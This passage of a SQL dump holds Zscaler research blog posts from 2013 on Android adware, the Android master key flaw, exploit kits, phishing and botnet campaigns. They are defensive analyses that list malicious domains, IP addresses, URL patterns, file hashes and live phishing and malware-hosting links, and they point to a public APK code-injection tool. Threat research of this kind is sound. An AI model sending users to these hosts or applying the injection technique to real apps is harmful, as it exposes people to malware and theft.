        com.motorola.launcher.permission.READ_SETTINGS    ·         android.permission.READ_SMS    ·         android.permission.VIBRATE    ·         com.motorola.launcher.permission.INSTALL_SHORTCUT    ·         com.fede.launcher.permission.READ_SETTINGS    ·         org.adw.launcher.permission.READ_SETTINGS    ·         android.permission.ACCESS_WIFI_STATE    ·         com.lge.launcher.permission.READ_SETTINGS    ·         android.permission.WAKE_LOCK    ·         android.permission.READ_CONTACTS    ·         com.google.android.c2dm.permission.RECEIVE    ·         android.permission.GET_ACCOUNTS    It can clearly be seen that this application asks for excessive permissions.         By analyzing this app statically, some suspicious privacy related data leakage can be seen :       	Device UDID  	Device IMEI(GSM)/MEID or ESN(CDMA) number  	Device geo-location  	Personal identification information leakage  	 Reads contact info.  	SMS activity  	Call activity  	Writes to external storage      Ad related libraries :       	Startapp  	Zestadz  	Admob  	Inmobi  	Airpush   	Mdotm  	Jumptap  	 Adwhirl  	Millennialmedia      List of URLs found in source code:       	http://api.airpush.com/api.php  	http://api.airpush.com/model/user/getappinfo.php?packageName=  	http://api.airpush.com/redirect.php?market=  	http://api.airpush.com/testicon.php  	http://api.airpush.com/testmsg2.php  	http://api.airpush.com/v2/api.php  	http://api.airpush.com/v2/api.php?apikey=  	http://cus.adwhirl.com/custom.php?appid=%s&nid=%s&uuid=%s&country_code=%s%s&appver=%d&client=2  	http://met.adwhirl.com/exclick.php?appid=%s&nid=%s&type=%d&uuid=%s&country_code=%s&appver=%d&client=2  	http://met.adwhirl.com/exmet.php?appid=%s&nid=%s&type=%d&uuid=%s&country_code=%s&appver=%d&client=2  	http://cus.adwhirl.com/custom.php?appid=%s&nid=%s&uuid=%s&country_code=%s%s&appver=%d&client=2      As can be seen, the Airpush API is leveraged by this particular application.         Zscaler dynamic analysis:         http://a.applovin.com/ad?placement=com.friendship.quotes.ui.CiteMania&cpu_speed=4787.82&os=4.0.4&platform=android&model=Nexus+S&accept=inter_pages,inter_size,custom_size&api_did=&hudid=378ce8cd300ddae2106ecb3edfb17c89e17e1b1e&locale=en_US&sdk_version=4.4.0-4.4.0&format=json&total_imps=0&session_imps=0&network=3g&sdk_key=6JpJkMwFTFwVz-JemtqwK3soQ6-tsxlJta7Xh8pnGMc5arUpzfeE8Q4hN-vum8UV6xCbBQzdynZ_Ka2hoNG4r-&sources=tpa&size=BANNER&hserial=2f10040ebab09e8887d7c8714eb44f86adc5adb3&brand=samsung&carrier=Android&app_id=6a5ff889bc4c6910&hphone=4bdd4f929f3a1062253e4e496bafba0bdfb5db75&hanid=ad4aca02186a44b8e31ce35749f3b4737f28c3eb&apps=6a5ff889bc4c6910,febbc860d4d7a2fc,16568adb3f980bfc,0a8e27d912567be3,bfc5013ffc85f778,dbca1157358a2895,27717f5c9c6d559c,fbb138470313edf4,eec390d1aa173f03,e3c4c9788f818fd9,3f816fa6882ad841,2bf5b1f5c88af849,fc991f708b270f04,e2d07cb448d55c1d,a9d65cee7359afc1,12c8b3d835ba9e21,7de8736fbac195c9,6c801094f6504785,e2bc2938862baf48,9c40104f66412490         The URL above illustrates an example of communication sent to the ad network. Advertisers collect such information to develop a profile for the device (and by extension the owner) in order to track the apps that are used so that targeted advertisments can be delivered to the device. The UDID is a unique identifier which can be leveraged to track a specific phone.                 Google Play Store apps flagged by more than 15 AV vendors:         com.god.lordhanuman.wallpaper    http://www.virustotal.com/file/2f8a1d5bb5dbd66962d30b37a609c7383dd6c9764426f1b8693066e3204e248d/analysis/    com.elift.hdplayer  http://www.virustotal.com/file/61ac5c6e1d65c83a24f0cbd04522cf191dd482f4e4880e834e4eb98857355f15/analysis/    com.nsex.hishar  http://www.virustotal.com/file/35f4710cb074545fe17ce6b2b210c7159384eaec4ee4b77a6f084b28d18d6973/analysis/    prank.xxx.videos.porn.app  http://www.virustotal.com/file/cf1bc23afbdd5b451c883c9e2f728dcf4afc4e110945b45627b04101b9d41552/analysis/    com.mobileriders.sex.workout  http://www.virustotal.com/file/bae10ad31a6a9d9e5131848e1f85d3ad5abc44b9bc0bafad1cbbb958bf65b265/analysis/    com.apptray.dumbbell.workouts  http://www.virustotal.com/file/97bbc480ba361fa483fa4954a52acbcc8c937bd0152d09058fcd7a31a014c69c/analysis/    com.laoyu.ringtone  http://www.virustotal.com/file/aa968157319a85b2c7ee9fe9a405184c5dd1ce0ab5971e13e33422b83bf0cd2e/analysis/    com.huashao.threeD  http://www.virustotal.com/file/885a97cdae23b1c0989cf8b29c01640620504c199e7c1724dcb3b2aaf2ff4344/analysis/    com.wangsong.costwatcher    http://www.virustotal.com/file/cf6b90580b92346c8f1fb9b3558925f1eeae1e8e8fbfac42283388e677a189f6/analysis/    com.huashao.Scary  http://www.virustotal.com/file/6233cb4641c1042a1d8880e4843f1b848fcba567c47a6649cb1d51db04c460ee/analysis/    com.god.lordvishnu.wallpaper  http://www.virustotal.com/file/5fe938ccc2fe4668795f3ea527a0c16b5a9fc7d78d70ee3bd43d18b344bd96db/analysis/    com.god.gurunanak.wallpaper  http://www.virustotal.com/file/f39cb97d259b2e4c9fde915f3792e34a700a74c97b3125c4772984a62e592794/analysis/    zhen.mor.saotyi  http://www.virustotal.com/file/360efd96e5db9ac8683930eb445ac76435b39ac38ef8ed13320207822766f7e5/analysis/    com.experience_game_3d.truck.parking  http://www.virustotal.com/file/2e941c7ff48409c8e139aec0a3db3af84676a2fc6beea7877689eb43cee56363/analysis/    yong.universalplayer  http://www.virustotal.com/file/d6675e3b833c8f4805f99198dc7ba85810d34041e08ceb72314b5b8b3ba32c12/analysis/    com.mine.videoplayer    http://www.virustotal.com/file/d72a0df97250f990d325714c9d9f69a5ec1595b2cad2f80a427cb1c064f7c238/analysis/    bys.widgets.lordvenkateshwara  http://www.virustotal.com/file/4a939c5a1f23ead3cd7a4bda7aebc7ca750fdc50484b110c34bb53f72306c892/analysis/    droids1.prasad.shiv3d  http://www.virustotal.com/file/16f7e29768665a7f66c666f035ce855bcf1e4f2640375cc63b96ddba71fde49b/analysis/    com.muk.durga  http://www.virustotal.com/file/d2196932ad4c343574cf2ef0dd51410a0052638e864c5e7caf1d12ed36f3e775/analysis/    com.muk.hanuman  http://www.virustotal.com/file/fc6cad34884e56a44ffa0de4acfd627113aa47fac80130e4c726486427c54010/analysis/    com.muk.lakshmi  http://www.virustotal.com/file/4ffc0d56ae32d36839b97e5bf4420bfe50b1968104f82f31bcbf3f27e9275c7d/analysis/    com.wind.funnyphoto  http://www.virustotal.com/file/d5d75fd12bc7aae28603f883eb39eacf784a616e16f1395696701581de014638/analysis/    com.outthinking.textonpic  http://www.virustotal.com/file/6a4bebaa2bb21634aab5082362e22ba022eeaa143610aa3d3184dda996eb59ae/analysis/    com.face.warp.deformer.distortion  http://www.virustotal.com/file/936978dce7a042efb7b1aebc6f8ed3b699457ccb6eb161020aae537cbfb836ce/analysis/    com.learn.effectone  http://www.virustotal.com/file/9603b8b2b74b84292e7275eee5311bbb6c959898bec26d438e73dfc9405d6784/analysis/    com.sweetsugar.whatsapplock  http://www.virustotal.com/file/5220608a893ddead034fb8f219ec763dfe9406c52487d13b288e4e81eac67078/analysis    com.clearhub.wl  http://www.virustotal.com/file/f4e9ba663b5a9b2e95e22925799479c36b9fd55b57ce848ea1b79c6392ea91e5/analysis/                 Why this is happening? Why are AV vendors flagging a huge number of applications as adware while Google is freely permitting them into the Google Play store? The excessive use of advertisements can negatively impact customer privacy and result in a negative user experience. On the other hand, advertisements are necessary for app developers looking to earn money when providing free apps. So where should the line be drawn? Google has clearly chosen to be very lenient with aggressive advertising practices, while Apple has taken the opposite approach, as they have shown that they’re willing to sacrifice advertising revenue to provide a positive user experience, even restricting the ability of advertisers to track device IDsand MAC addresses.    How do we define adware? We feel that adware exhibits one or more of the following intrusive behaviors without requesting appropriate user consent(ref- Lookout Blog)      	Harvests excessive personally identifiable information  	Performs unexpected actions in response to ad clicks without appropriate user consent (appropriate user consent entails providing a clear alert in the application that the user canaccept or decline before any behavior takes place)  	Collects IMEI numbers, UDIDs or MAC addresses  	Initiating phone calls and SMS messages  	Changing wallpaper and ringtones  	Leaks location information  	Leaks email addresses  	Leaks personal information such as contacts, birthdays, calendar appointments, etc            We base our own categorization of adware-enabled apps on the aforementioned definition. Hopefully Google and the AV vendors can reach a compromise in this ongoing adware battle as at present, end users are paying the price.', 'Mobile Malware', 'https://www.zscaler.com/blogs/research/gap-between-google-play-and-av-vendors-adware-classification');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (231, 'Zscaler Releases Android Master Key Vulnerability Scanner', 'Viral Gandhi', 'August 01, 2013', 'The recently disclosed Android master key vulnerability by CTO of BlueBox Jeff Forristal, allows an attacker to inject malicious code into an Android application without the need to alter or invalidate the application’s digital signature. This impacts almost all current Android implementations and to make matters worse, patches cannot be issued directly by Google, but require individual handset manufacturers to provide patches for their unique Android implementation. To date, some have provided patches, while others haven’t.\r\n\r\nThis vulnerability allows an attacker to inject malicious code by placing duplicate executable files – such as classes.dex – into an application package. The package verification that occurs during installation is done against only the original, legitimate file and thus the .apk passes the verification. However, at runtime, the duplicate .dex file will also be executed. The attacker’s malicious code in the second classes.dex may for example, have a routine for leaking personal information such as email addresses or IMEI numbers. It could also send SMS or make calls without user consent. A second AndroidManifest.xml file supporting the second classes.dex, replaces the legitimate .xml file, so that additional permission declarations are injected along with necessary permissions needed by the malicious classes.dex file. \r\n\r\nOpen source tools are already available which allow for code to be injected into an .apk file and modify the Android manifest file to take advantage of this vulnerability. One such tool is available here -  https://gist.github.com/poliva/36b0795ab79ad6f14fd8. \r\n\r\nWhile a user may notice the excessive permissions that are required by the second android manifest file at the time of installation, it’s quite likely that this attack will go completely undetected. As apps have already been spotted in the wild exploiting this vulnerability, Zscaler has developed a simple web application designed to scan any .apk to identify those apps that are exploiting the Android Master Key vulnerability. Our web app works by checking the integrity of the .apk file. Specifically, it dissects the .apk file to look for the presence of additional, malicious classes.dex files or any extra Android manifest files. You simply need to upload any .apk to the scanner in order to obtain a report indicating if the Android app is taking advantage of this vulnerability. \r\n\r\nThe scanner is freely available and can be found at https://zulu.zscaler.com/ \r\n\r\nScan your apps and be safe.', 'Vulnerability', 'https://www.zscaler.com/blogs/research/zscaler-releases-android-master-key-vulnerability-scanner');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (232, 'Malware Using GoogleCode For Distribution', 'Chris Mannon', 'July 31, 2013', 'Malware hosting sites rarely stay up for too long.  After the first few instances are seen by security vendors, they are added to blacklists which, in turn, are fed into other blacklists throughout the industry.  Malware writers are now turning to commercial file hosting sites to peddle their warez.  If these legitimate file hosts are not scanning the content they are hosting, it may force network administrators to block the service altogether.  The kicker is that this time we see that GoogleCode seems to have swallowed the bad pill.    The first file in question is hosted at: hxxps://code.google.com/p/onflashplayers/source/browse/AdobeFlashPlayer.exe         You may also recognize it by a few other names as seen here(21/45):  https://www.virustotal.com/en/file/12ba2c059963799fda3b48bce3d51f06940c7cdcb7b20559c752acdee2d43594/analysis/1375130106/    We also have reports of this file being downloaded via Dropbox, but it appears to have been taken down at the time of research                 This incident sets a precedent that no file hosting service is beyond reproach.  Blind trust of specific domains should not be tolerated from an organizational or personal perspective.  So set those security privileges to kill and keep one eye open for shady files coming from even a seemingly trusted location.    Other files from this location that were also flagged as malicious as noted below:  fc79708c4b5a7ac7ffc666c65af3d402 - 9/46  4372fa69e33307b8998447e3a79ed13a - 7/46  d9040e39cc4b9e2ce19dcb2fa26e2d36 - 17/46  93650214ef3c5e0f7fc657150fe4f670 - 13/46  9a85728e541c1dd34ec8ecca02f3ba92 - 6/46  f7dd919004cb65f89ae87f0360222f05 - 17/46  79bfcaf15acbb4f6e00df9f5e9e97078 - 4/45  6f197c2542933bb1a94916312f2075f7 - 5/45  a6a054ff40e24fe1e67230a4dec282cd - 21/46  9e49f709cd6df526cb261969a1239ef1 - 16/46  7d7b1329d25731c779fcd3ba41003cea - 9/46  86680f427e4c139f4112f506d8b2a770 - 21/46  3fd508edba21cb1c9f69e316828d8847 - 16/45  a1a66e2aadb4b4e231513f9e49166c72 - 16/46  3f8cd82f528fd7bd7635639583e4da09 - 22/46  5abbdd8b0f60e4ad80cd328d80fde7b9 - 12/46  3b1d052884949231f8a8ab927dffc0de - 5/46  e553a555c20a6a9caab15471fc147a4c - 8/46  38f148e53f44394911c6d876c6288407 - 5/46  3715ff5da288cfbb548b424722b664d6 - 6/46  04c3adff92b188dcfc0b944a457f3d74 - 5/46  4372fa69e33307b8998447e3a79ed13a - 7/46  fa694888e878efc6afb4e4781b007154 - 5/45  d256a34f4d9be8a74033c7bede40b2aa - 16/46  a842fcda221aaddd2fa21f77abaf91ce - 8/46  b4ee1ea0494f0800635e8d8398bc7779 - 22/46  7548f78f7e626403dd503421d1e6e42d - 6/46  d276561d27e2a343e2ace1fbbf9474e3 -  5/46  f951cfcfe8f293c2fa551297222fb37a - 13/46  9da48c984b71e26887b3c58f7a5c5d05 - 5/46  8fcb14b676fa0ecacbee92b702ce59b4 - 16/46  09e82c7811d1e155e6825a4aa98455bb - 8/46  3c76a70ffb42a9c2071b05bb0a430b5e - 5/46', 'Malware', 'https://www.zscaler.com/blogs/research/malware-using-googlecode-distribution');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (233, 'Phishing For Ad Scams', 'Chris Mannon', 'July 24, 2013', 'Today we have a perfect storm of basic attack vectors which inevitably lead victims to a variety of advertising scams including adware executables, parked domains, pay-per-click scams or phishing sites.  First a small list of all of the websites seen to be hosting this threat.    	1yahoo.com/  	testflightapps.com/  	www.find-your-date.org/  	www.conmdirect.de/  	www.chanuteinsurancepool.net/  	translateitonline.com/  	compartel.gov.cofacebook.com/  	www.autobypass.com/  	rerbox.com/  	ravelrey.com/  	www.corall.com/  	accountservices.wiipro.com/  	losangeles.craigslst.org/  	www.styel.com/  	spritnpcs.com/  	www.nbarumors.com/  	www.eetime.com/  	bleacherrepot.com/  	www.elmundoe.es/  	iflswa.com/  	debshop.com/  	www.cnnis.com/  	myfintesspal.com/  	televisaeportes.com/  	www.testflightapps.com/  	wwwbunte.de/  	hiffingtonpost.com/  	bhestbuy.com/  	www.dbm.de/  	noobroom6.com/  	scripts.codingclick.com/  	eaterny.com/  	www.thatlantic.com/  	usnwwc.com/  	texasrangersmlb.com/  	idlebrian.com/  	laspass.com/  	spliwise.com/  	www.iflswa.com/  	www.usbankhomemortagage.com/  	www.linkdein.com/  	mdrudgereport.com/  	theeverywhereist.com/  	www.hiffingtonpost.com/  	redditt.com/  	www.saukaryam.com/  	malaimalar.com/  	www.bradypeople.com/  	bmohariss.com/    The thing that all of these websites have in common is that they all take advantage of cybersquatting, by registering slight variations of popular domain names. This common phishing technique is used to bring a false sense of certainty that the victim is on the intended website. These websites were pulled together from a list of referral URLs, which matched a common pattern for dubious redirection found in Javascript files.  Once the user visits the site, they are presented with a Javascript redirect via an iFrame, similar to the following:                       This immediately takes you to a seemingly random series of advertising scams. One of the scams presents a \"Click Here To Enter\"link.       	  		  			  		  		  			NO DON\'T!  			   		  	    The above picture is the only visible addition to this page.  After clicking on the link, the victim is immediately sent to a page that leads them to suspect their Browser/Flash version is not up to date.                  These cases both resolve to one of two adware binaries being installed on the customer\'s system.    https://www.virustotal.com/en/file/a157438070a712bbd3c26ff9de26eb8013af7b18d63d6d707553e45e3369c2f2/analysis/1374266431/  https://www.virustotal.com/en/file/56eebb8067af1febd1ecb35b4ece27fab83200ba6d4e1815749decdcdad9eb1b/analysis/1374266466/     In other cases, the victim is only redirected to a pay-per-click scam that promises \"Free Vouchers\" and free Apple products, but fails to deliver.                       Revisiting one such domain in the list will only lead the victim back to a parked domain page. This is done to discourage researchers from dissecting their threat to avoid meaningful detection from security vendors.  The best idea to avoid misdirection from such phishing attempts would be to tighten up your browser security.', 'Phishing', 'https://www.zscaler.com/blogs/research/phishing-ad-scams');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (234, 'FlimKit Coughs Up More Malvertising', 'Chris Mannon', 'July 11, 2013', 'FlimKit is a known exploit kit which takes advantage of Java Vulnerabilities in order to drop malicious content on the victim\'s PC.  Previous iterations of this Exploit Kit were known to be distributed through at least 1 popunder service.  The EK itself is fairly straight forward.  Like so many other kits, it begins with a malicious flash based redirect from a malvertising ad.  From there it will exploit known Java vulnerabilities to drop JAR file which in turns will give you a malicious executable.  In most cases, this will be some variation of ZBOT.\r\n\r\nThe following domains were seen as newly added to the FlimKit drop:\r\n \r\n\r\n\r\n	9euei.info\r\n	kvmhja.info\r\n	sdjeu7.info\r\n	adiwep.info\r\n	d0e9ue.info\r\n	idueya.info\r\n	sdioep.info\r\n	sieod.info\r\n\r\n\r\nPrevious iterations of this exploit were also sent as part of known ad services.  This instance is no different other than they have obviously branched out to other services to spread their malvertising message.  Through my research I found that the following ad services were known to send user\'s to the malicious Exploit Kit which exploits CVE-2013-2423:\r\n\r\n\r\n	yieldmanager.net\r\n	smxchange.com\r\n	glispa.com\r\n\r\n\r\nAs far as the actual exploit is concerned, there is solid example seen here.', 'Exploit Kit', 'https://www.zscaler.com/blogs/research/flimkit-coughs-more-malvertising');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (235, 'Tracking A Botnet Infection', 'Julien Sobrier', 'July 10, 2013', 'Recently we found several malicious executables with similar characteristics. These files were found on the following six domains:           	janashfordplumbing.com  	kalliskallis.com  	lowes-pianos-and-organs.com  	continental1.com  	foreigntire.com  	gjhimages.com      The URLs used, adhered to the following two formats:                	http://www.[domain].com/awstats6_data/[a-f0-9]{10}/?f=sm_main.mp3&k=[0-9]{15}  	http://www.[domain].com/images/[folder]/[folder]/[a-f0-9]{10}/?f=sm_main.mp3&k=[0-9]{15}       These six domains are otherwise legitimate sites that have been compromised and used to serve malicious content. While I didn\'t determine the vulnerability used to obtain  control of these websites, all of them were misconfigured, allowing directory listings (viewing all files available in folders) and/or having AWSTATS publicly available.    The malicious files kept changing, with different signatures. Their behavior, however, was always the same and was identified as a botnet. When executed, the botnet hides itself in the Recycle bin and infects other running processes. It connects to over 50 IP addresses over UDP/16471 and TCP/16471. These IPs keep changing with each file and each execution.    The botnet always connects to xlotxdxtorwfmvuzfuvtspel.com through HTTP, but the domain answers with an empty response. You\'ll notice that the malware uses HTTP/1.0 with a Host header (not RFC compliant), often a good sign of malicious HTTP activity.                     	  		  			  		  		  			HTTP request to C&C  		  	        We found the malicious samples through Behavior Analysis, then used our log correlation to find the source of the malicious executables.', 'Analysis;APT', 'https://www.zscaler.com/blogs/research/tracking-botnet-infection');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (236, 'Phishers Target Yahoo Users', 'Julien Sobrier', 'June 04, 2013', 'Yahoo Mail introduced two-factor authentication in December 2011. Two-factor authentication can be used to prevent suspicious access to an account (login from a different country, numerous failed login attempts, etc.) and can be used to verify a user\'s identity when asking for a password reset.\r\n\r\nTwo-factor authentication has been in the news a fair bit lately as LinkedIn and Twitter have recently begun to offer the feature. We encountered an example whereby a phisher actually took advantage of heightened awareness of two-factor authentication to aid in an attack. The scam involved spoofed e-mails, which claim that all Yahoo users must turn on two-factor authentication:\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Phishing e-mail to Yahoo Mail users\r\n		\r\n	\r\n\r\n\r\nThe e-mail has a spoofed FROM address (@yahoo.com) and a fake link to http://update.yahoo.com/. The user clicking on this link is actually redirected to a phishing page at http://www.antek.com/pics/tiles/yahoo.com.html as shown below:\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Yahoo phishing page\r\n		\r\n	\r\n\r\nAt present, this URL is blocked by Google Safe Browsing (Firefox, Chrome, Safari) but not by Internet Explorer.\r\n\r\nYahoo is now shutting down their Yahoo Mail classic interface and forcing users to their new e-mail platform. This will no doubt be another great opportunity for phisher to take advantage of confused users.', 'Uncategorised', 'https://www.zscaler.com/blogs/research/phishers-target-yahoo-users');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (237, 'Rise In Red Kit Exploit Kit Activity', 'ThreatLabz', 'June 01, 2013', 'This week, a malicious pattern of activity was observed in websites being compromised, which in turn redirected to a Red Kit exploit kit (EK) landing page. Some infected websites that were seen:    	neptunebenson[dot]com  	route66marathon[dot]com  	whitesteeple[dot]com     (Warning! these sites may still be infected).     Two different mechanisms were used to infect the websites. The first one being a standard iframe injection, which leads to the Red Kit EK landing page through URL redirections. The other mechanism leverages SEO based techniques to carry out HTTP 302 redirections that lead to the RedKit EK landing page.    The snapshot below shows some of the sample URLs/SEO redirections that were seen. Please refer to this URLQuery search in order to identify other URLs exhibiting the redirection patterns.      Upon visiting the infected webpage, it sends the user to a malicious redirection (HTTP 302). The actual exploit code as shown below is then ultimately delivered.                The first landing page uses a typical RedKit Exploit, which contains the obfuscated URL that is used to fetch the payload as shown in the highlighted box below.         The Java Sandbox bypass exploit is carried out leveraging an unsigned applet with the suspicious parameter \"__applet_ssv_validated\" passed, which exploits the following vulnerabilities:  CVE-2013-1493 / CVE-2013-2423 / CVE-2012-1723.             The jar applet gets the obfuscated URL from the parameter \"name\", which is passed by the jnlp as shown above. It is then decoded into the final URL through the following code:         This URL contains the encrypted binary payload. The applet creates a URL Connection Steam to download the encrypted binary stream. The binary stream is then decrypted using the AES CBC 128 bit cipher block chaining scheme. The IV (Initial Vector) and the decryption key are stored inside the applet. After decryption, it stores the binary file onto the temporary folder with a random filename by making a call to java.io.tmpdir. The snapshot below summarizes some of the important routines involved in the decryption process.        The binary file was packed using UPX and has anti-vm/anti-debugging detection routines. The binary is a Keylogger Tojan that steals credentials such as credit card numbers, passwords etc. and sends it over to a remote location. Currently, the binary is being detected only by three AV vendors as malicious.          Binary Reports:         https://www.virustotal.com/en/file/33dca051d6ad48d09fdee7a14dfacc32c174616743ea16421d6fa4ccb77aeb71/analysis/         http://www.threatexpert.com/report.aspx?md5=61925c0254ca1b8704b1fb78faedaaaf         Jar File Report:          https://www.virustotal.com/en/file/13bfc250788893efaf9f8ad7d98fe1f01e5eb28f025fcdac9013470c7c9635fb/analysis/         It is always a good practice to keep vulnerable browser plugins such as Adobe/Java constantly updated. This protects the end user from malicious EKs leveraging known vulnerabilities. For more specfic information related to Java Plugins and how to disable them, please refer this great blog post from my colleague Julien Sobrier.', 'Exploit Kit', 'https://www.zscaler.com/blogs/research/rise-red-kit-exploit-kit-activity');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (238, 'Darkleech Attack Continues To Grow', 'ThreatLabz', 'May 21, 2013', 'The Apache Darkleech attack has been in the news for quite some time now. The first compromise that we identified in our transactions dates back to mid-March. This Darkleech exploit (aka Linux.Cdorked)  injects malicious redirections into a website that leads to a Blackhole exploit kit (BEK) landing page. Sucuri published up a great write up about the Darkleech infection mechanism on the server side.\r\n\r\nWe are currently observing a considerable rise in websites being compromised due to this attack. The infected websites redirect to a version of the Blackhole Exploit Kit v2. We identified the following sites being compromised in the past week within observed Zscaler traffic:\r\n \r\n202.218.253.214\r\nbazzillbasics.com\r\nbigfishermanseafood.com\r\nclasificados.zocalo.com.mx\r\ncolima.vendidoalas3.com.mx\r\nembarque.com\r\nkimindschool.com\r\nmapas.guiaroji.com.mx\r\nmediagazer.com\r\nmiddleschoolbook.com\r\nmpsrail.co.uk\r\nnew.schoolnotes.com\r\nnewsofthepast.com\r\nnorwalkmedicalgroup.com\r\nreports.valeopartners.com\r\nstudioartsdallas.com\r\nunit2.euro2day.gr\r\nv2.wallpaperzip.com\r\nwww.264thegrill.com\r\nwww.acadianabusiness.com\r\nwww.alancristea.com\r\nwww.aqua-medic.com\r\nwww.aquapurawater.ca\r\nwww.backroads.org\r\nwww.beachcamsusa.com\r\nwww.bsgco.com\r\nwww.chicagohomeestates.com\r\nwww.compactpowercenter.com\r\nwww.companyrescue.co.uk\r\nwww.eastpak.com\r\nwww.euro2day.gr\r\nwww.flowersandservices.com\r\nwww.fortworthzoocoupons.net\r\nwww.freedieting.com\r\nwww.gite-mer.com\r\nwww.grandlifehotels.com\r\nwww.jackshainman.com\r\nwww.momentumtraining.biz\r\nwww.nevadasecuritylicense.com\r\nwww.qualityenvironmental.co.uk\r\nwww.ranabroadband.net\r\nwww.rentalsource.com\r\nwww.servo2go.com\r\nwww.superiorvalves.com\r\nwww.theacme.com\r\nwww.trulia.com\r\nwww.vbbound.com\r\nwww.visit-montenegro.com\r\nwww.volpifoods.com\r\n\r\nThe following list shows the list of IPs and websites observed serving the Blackhole Exploit kit landing page.\r\n \r\n129.121.101.227\r\n129.121.104.90\r\n129.121.108.220\r\n129.121.113.217\r\n129.121.120.211\r\n129.121.168.226\r\n129.121.194.244\r\n129.121.199.90\r\n129.121.201.230\r\n129.121.45.181\r\n129.121.55.185\r\n129.121.61.189\r\n129.121.65.124\r\n129.121.85.166\r\n143.95.13.5\r\n143.95.1.6\r\n143.95.17.5\r\n143.95.1.8\r\n143.95.2.6\r\n143.95.7.6\r\n149.47.113.128\r\n149.47.149.225\r\n149.47.154.201\r\n149.47.205.179\r\n149.47.21.162\r\n149.47.218.128\r\n149.47.22.176\r\n149.47.225.171\r\n149.47.245.128\r\n173.233.133.30\r\n173.233.133.43\r\n173.233.134.138\r\n173.244.221.89\r\n174.37.210.122\r\n174.37.210.127\r\n208.166.50.27\r\n208.43.236.169\r\n208.69.183.138\r\n208.69.183.205\r\n209.126.248.63\r\n216.154.208.125\r\n64.247.176.220\r\n64.247.180.106\r\n65.75.145.203\r\n65.75.168.252\r\n65.75.174.197\r\n65.75.176.120\r\n65.75.184.70\r\n65.75.185.243\r\n65.75.188.211\r\n65.75.190.59\r\n67.213.213.23\r\n69.89.4.92\r\n69.89.5.224\r\n69.89.9.47\r\nadanakenthaber.com\r\naftabcurrency.eu\r\nakmusik.org\r\nalzagh.com\r\naminexchange.net\r\naustriawanderer.com\r\nbasquet-atletico.lendanearlongisland.com\r\nboomchoon.co.uk\r\nbudgettyremaintenance.co.uk\r\ncariparker.co.uk\r\ncinselmarket.org\r\ncountryandleisureclothing.co.uk\r\negyptwanderer.com\r\nelkadytrans.com\r\nfirstbytemicro.com\r\nforyouroccasions.co.uk\r\ngeorgemediahouse.co.uk\r\ngheep.co.uk\r\ngshcontracts.co.uk\r\nhcxmy.com\r\nhungarywanderer.com\r\nlcwceramics.co.uk\r\nleventerkekkuaforu.com\r\nlovehost.co.uk\r\nmoneystopltd.co.uk\r\nmpsrail.co.uk\r\nmtlssc.org.uk\r\nondervreemdevlag.nl\r\npartitioningsoutheast.co.uk\r\nplatjadarovirtual.com\r\nrika.100pixels.co.uk\r\nsms.nozom.com.eg\r\nteddyrepair.co.uk\r\nupminstercontainers.com\r\nwallpapers.animalz.gr\r\nwcwr.co.uk\r\n\r\nThe following pattern in the URL was observed:\r\n\r\n\\/[a-z0-9]{16,32}\\/q.php\r\n\r\nWe also identified the following user-agent strings when the redirection was made:\r\n \r\nJava/1.6.0_26\r\nJNLP/1.7.0 javaws/10.21.2.11 () Java/1.7.0_21\r\nJNLP/6.0 javaws/1.6.0_03 (b05) Java/1.6.0_03\r\nJNLP/6.0 javaws/1.6.0_26 (b03) Java/1.6.0_26\r\n\r\nThe user agents found while visiting these infected sites were mainly: MSIE_7_X, MSIE_8_X and MSIE_9_X.\r\n\r\nUpon visiting an infected website, it redirects to a standard BEK v2 landing page as shown below.\r\n \r\n\r\n\r\nThe exploit code targets vulnerabilities in multiple plugins including Adobe PDF and Java when run on IE, causing the attacker to load malicious code in the context of the application. When deobfuscating the PDF exploit, we can see the final URL used for redirection, as shown in the image below. However, this URL was not accessible (404 error response), at the time of writing, hence it was not possible to retrieve the malicious binary file.\r\n \r\n\r\n \r\n \r\n\r\n\r\n\r\nUpon revisiting some of these compromised websites, it was found that the page was no longer serving the injected code. This provides a clue. The attackers probably choose random sites running the Apache Webservers that are vulnerable to the dark leech exploit and infect them only for a brief period of time and then clean them up. Hence tracking Darkleech infections is can be a challenging task. For further details on the vulnerability and how the server can be patched, please refer to CVE-2012-1557.', 'Analysis;Compromise;Exploit Kit', 'https://www.zscaler.com/blogs/research/darkleech-attack-continues-grow');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (239, 'Fake YouTube Page Targets Chrome Users', 'Julien Sobrier', 'May 16, 2013', 'Fake YouTube pages are one of the favored ways attackers leverage to get users to click on malicious content. These fake pages often look the same, but the source code can reveal a new twist. This time, a recently encountered fake YouTube page host at http://facebook-java.com targets Google Chrome users only.       	  		  			  		  		  			Fake YouTube page  		  	      We have found a many malicious sites that specifically target Internet Explorer or Firefox users, but not often Google Chrome users. In this example, any click on the fake video player or the fake ad attempts to install the following extension for Google Chrome: https://chrome.google.com/webstore/detail/nhmibhinlbilhaflldckbeokphjoifhi.         	  		  			  		  		  			JavaScrip code that installs a Chrome extension  			   			   		  	      You may have noticed that the extension is hosted in the official Google Chrome store. Google disabled the installation of extensions for 3rd party sites in June 2012, and silent installs in late 2012.    The Chrome store page does not show any information about the extension:         Let\'s install the extension hosted at http://facebook-java.com/.       	  		  			  		  		  			List of permissions requested by the extension  		  	    A new icon is added next to the URL bar:      The link redirects to http://www.getjava.net/. This shows the same page as facebook-java.com. It tries to install another extension from the Chrome store, but this one has already been removed.       	  		  			  		  		  			getjava.net  		  	    Now that the extension has been installed, it is not possible to open Tools or Settings in Chrome. Instead, a tab opens to https://www.facebook.com/?get_cod whenever those functions are accessed. The corresponding code in the malicious extension shows how it is done:       	  		  			  		  	